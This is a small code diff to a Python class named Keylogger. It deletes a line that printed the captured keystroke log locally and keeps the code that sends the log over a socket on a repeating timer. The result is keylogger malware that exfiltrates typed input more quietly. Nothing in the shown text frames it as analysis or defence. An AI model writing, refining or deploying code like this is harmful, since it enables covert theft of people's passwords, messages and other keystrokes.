@@ -27,7 +27,6 @@ class Keylogger:
 
 	def report(self):
 		global log
-		print(self.log)
 		self.s.send(self.log.encode())
 		self.log = ""
 		timer = threading.Timer(self.time_interval, self.report)
